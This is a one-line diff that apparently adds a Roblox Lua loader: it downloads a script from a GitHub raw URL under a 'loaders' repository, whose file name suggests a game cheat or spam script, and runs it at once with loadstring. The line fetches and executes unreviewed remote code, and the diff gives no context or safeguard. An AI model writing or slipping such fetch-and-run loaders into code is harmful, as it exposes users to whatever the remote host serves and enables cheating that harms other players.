@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/build-and-conquer-v0-1-spam4-t5z52mkukxwj1q.lua"))()
